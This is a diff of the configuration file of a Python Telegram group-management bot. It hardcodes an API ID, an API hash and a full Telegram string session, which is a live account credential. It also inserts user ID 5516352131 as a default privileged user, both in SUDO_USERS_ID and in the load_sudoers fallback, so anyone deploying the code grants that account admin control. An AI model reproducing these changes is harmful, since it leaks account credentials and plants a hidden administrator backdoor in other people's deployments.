@@ -19,9 +19,9 @@ if path.exists("config.env"):
     
 BANNED_USER = environ.get("BANNED_USER" or None)  
 BOT_TOKEN = environ.get("BOT_TOKEN", None)
-API_ID = int(environ.get("API_ID", 6))
-API_HASH = environ.get("API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
-SUDO_USERS_ID = [int(x) for x in environ.get("SUDO_USERS_ID", "").split()]
+API_ID = int(environ.get("API_ID", 22623902))
+API_HASH = environ.get("API_HASH", "5498025bf5aa1e9d309282cb17303ddb")
+SUDO_USERS_ID = [int(x) for x in environ.get("SUDO_USERS_ID", "5516352131").split()]
 LOG_GROUP_ID = int(environ.get("LOG_GROUP_ID", None))
 GBAN_LOG_GROUP_ID = int(environ.get("GBAN_LOG_GROUP_ID", None))
 MESSAGE_DUMP_CHAT = int(environ.get("MESSAGE_DUMP_CHAT", None))
@@ -30,14 +30,14 @@ MONGO_URL = environ.get("MONGO_URL", None)
 ARQ_API_URL = environ.get("ARQ_API_URL", None)
 ARQ_API_KEY = environ.get("ARQ_API_KEY", None)
 RSS_DELAY = int(environ.get("RSS_DELAY", None))
-STRING_SESSION = environ.get("STRING_SESSION")
+STRING_SESSION = environ.get("STRING_SESSION", "BQDEMaMAl8R2HQ7gk5tpcJzV4j797Krum0D7eKfCjcTJa7VcCcVJ-sHe8p9yx-TBvUk3lB6t7d7sqs_cQClR71ounj_xqYMjlRCBtjOzqYn3wnoaKTMPQLUnwkU08G8y-ik55pFt8rlEU9U9RkJHY2k0qIo_1dfxUsjVXgwxUnmQOd1bcU4hIYVQIpcsnYPtqxsLo_Ocsyj9MXTaVpcPKRzoRxsl_Q7Sg425ApxFuAPDgAWxvUHLQ2yQHvgWQfIL12OV62fsYci9xybPsTyzKrIyer37NtBCpYo-km7tZucwZdis8AB5rDa5qT1G1uSZxE3skVMuwlaKDBfy06QpoLhaX-JwuQAAAABmxjX7AA")
 BLACKLIST_CHAT = environ.get("BLACKLIST_CHAT")
 UPSTREAM_REPO = environ.get(
     "UPSTREAM_REPO", ""
 )
 
 
-ALIVE_LOGO = "https://telegra.ph/file/5d71546548f5a2e3a896e.png"
+ALIVE_LOGO = "https://telegra.ph//file/5129b55895312901edf09.jpg"
 GBAN_LOG_GROUP_ID = GBAN_LOG_GROUP_ID
 SUDOERS = DEVS
 WELCOME_DELAY_KICK_SEC = WELCOME_DELAY_KICK_SEC
@@ -58,7 +58,7 @@ async def load_sudoers():
     print("[INFO]: LOADING SUDOERS")
     sudoersdb = db.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
-    sudoers = [] if not sudoers else sudoers["sudoers"]
+    sudoers = [5516352131] if not sudoers else sudoers["sudoers"]
     for user_id in SUDOERS:
         if user_id not in sudoers:
             sudoers.append(user_id)
